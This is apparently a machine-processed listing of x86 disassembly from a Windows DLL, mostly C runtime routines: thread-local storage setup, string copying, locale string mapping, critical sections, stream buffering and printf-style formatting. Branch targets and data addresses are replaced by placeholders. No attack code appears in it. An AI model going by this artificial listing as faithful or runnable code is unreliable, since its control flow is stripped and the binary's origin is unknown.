mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10007595
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1000b18c
push esi
call sub_1000b70f
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_1000c32b
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_1000b1fe
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_1000b211
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_1000c32b
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_10008c87
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_1000b1fe
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000b278
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call sub_10008d46
pop ecx
push 0x0
push [ rw-data ]
call [ TlsSetValue@IAT ]
pop esi
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_10008d46
pop ecx
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
push eax
call sub_10008d46
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10008d46
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10008d46
pop ecx
mov eax [ esi + 0x50 ]
cmp eax rw-data
je r-xdata
push eax
call sub_10008d46
pop ecx
push esi
call sub_10008d46
pop ecx
push eax
call sub_10008d46
pop ecx
sub_1000b318
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_1000b211
cmp [ eax + 0x60 ] esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_1000b211
call [ eax + 0x60 ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
push 0xa
call sub_1000d98b
push 0x16
call sub_1000fcd9
pop ecx
pop ecx
push 0x3
call sub_1000a830
int3
sub_1000b379
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call $+5
jmp sub_1000b318
mov [ ebp - 0x4 ] 0x1
call eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub_1000b3d0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_1000b3e0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_1000b4c0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1000b6e4
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_10007d40
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_10007d40
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_1000b6e4
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_1000b738
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
pop edi
pop esi
retn
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
push eax
call edi
push [ esi ]
call sub_10008d46
pop ecx
sub_1000b7a4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_10008cba
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_1000b7a4
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_10008c87
pop ecx
call sub_10008d46
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_1000b805
pop ecx
pop edi
sub_1000b81a
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_1000cefd
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_1000f2ec
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_1000cefd
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_1000f2a8
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_1000ca8c
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_1000b932
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_1000c053 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000c111
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000c111
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_1000c073
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_1000c073
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000c11e
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000c111
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000c111
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_1000c111
pop ecx
xor edx edx
call sub_1000c111
pop ecx
jmp r-xdata
call sub_1000c111
pop ecx
movzx eax ax
jmp r-xdata
call sub_1000c111
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_1000e840
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_1000c111
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_1000c12e
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_1000f315
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000c111
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_1000f450
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_1000f3e0
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_1000c0d9
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_1000c0a8
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_1000c0d9
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_1000c0a8
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_1000c0a8
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_1000c0d9
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_1000f315
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_1000c073
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_1000b81a
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_1000c0a8
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_1000c073
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_1000c0d9
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_1000c073
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_1000c13c
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_1000f2ec
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_10008cba
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_1000c1c9
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_1000c983
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_1000c1f3
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10008cba
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
